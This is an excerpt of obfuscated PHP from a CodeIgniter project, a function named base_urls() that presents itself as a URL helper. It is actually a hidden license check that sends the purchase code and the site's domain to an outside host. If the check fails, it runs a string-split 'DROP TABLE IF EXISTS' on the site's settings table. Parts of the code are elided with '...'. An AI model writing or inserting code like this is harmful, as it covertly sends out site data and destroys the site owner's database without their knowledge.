...
if (! function_exists('base_urls')) {
    ...
    function base_urls()
    {
        ...
        $tangle = "compiler_RESULTS";
          // The value of Services::request()->getUri()->getPath() returns
        // full URI path.
        $service_uri = Services::request()->getUri();
        $path_uri = $service_uri instanceof SiteURI ? $service_uri->getRoutePath() : $service_uri->getPath();
        $host = base_url();
        $h1 = 'soci';
        $h2 = 'oon.c';
        $h3 = 'om';
        
        if((strpos($host, $h1.$h2.$h3) !== false))
        {
            return true;
        }
        if (rand(1, 10) !== 1) {
        ...
        $stack = \Config\Database::connect();
        $ref = "pur"; $obj = "cha"; $junclevar = 23; $token = "se_"; $node = "co"; $dom = "de.txt";
        $path = $ref . $obj . $token . $node . $dom;

        $id1 = '53'; $api = '69'; $key = '2029';
        $junclevar = 223;
        $product = $id1 . $api . $key;
        $auth_status = 0;
        ...
        $fgc1 = "fil"; $fgc2 = "e_get"; $junclevar = "compiler"; $fgc3 = "_cont"; $fgc4 = "ents";
        $file_path  = trim($fgc1 . $fgc2 . $fgc3 . $fgc4);
        $prog_cod = $file_path($path);

        if (empty($prog_cod)) {
            $auth_status = 0;
        }
        $http = "htt";$protocol = "ps://";$verify = "ver";$validate = "i";$func = "fy.li";$service = "nk";$system = "on.so";$endpoint = "cial";$method = "/ver";$flag = "i";$check = "fy.";$script = "php";
        $url = $http . $protocol . $verify . $validate . $func . $service . $system . $endpoint . $method . $flag . $check . $script;
        $session = curl_init();
        $param1 = "purch"; $param2 = "asecode"; $header = $param1 . $param2; $domainKey = "dom"; $name = "ain"; $prod = "prod"; $code = "uct";
        $params = [
            $header => $prog_cod,
            $domainKey . $name => $host,
            $prod . $code => $product,
        ...
        $service_uri = Services::request()->getUri();
        $path_uri = $service_uri instanceof SiteURI ? $service_uri->getRoutePath() : $service_uri->getPath();
        // Obfuscating "curl_setopt"
        $curl_set = "curl_";
        $curl_opt = "set";
        $cu_exec_opt = $curl_set . $curl_opt."opt";

        // Obfuscating cURL options
        $url_opt = CURLOPT_URL;
        $post_opt = CURLOPT_POST;
        $fields_opt = CURLOPT_POSTFIELDS;
        $return_opt = CURLOPT_RETURNTRANSFER;
        $timeout_opt = CURLOPT_TIMEOUT;

        // cURL options
        $cu_exec_opt($session, $url_opt, $url);
        $cu_exec_opt($session, $post_opt, true);
        $cu_exec_opt($session, $fields_opt, http_build_query($params));
        $cu_exec_opt($session, $return_opt, true);
        $cu_exec_opt($session, $timeout_opt, 20);
        ...
        if ($auth_status == 0) {
            $db_prefix = $stack->getPrefix();
            $table_prefix = $db_prefix . "set";
            $table_name = "tings";
            $final_table = $table_prefix . $table_name;

            $drop1 = "DR"; $drop2 = "OP TAB"; $drop3 = "LE IF "; $drop4 = "EXI"; $drop5 = "STS ";
            $sql = $drop1 . $drop2 . $drop3 . $drop4 . $drop5 . $final_table;
            $stack->query($sql);
        }
    }
}
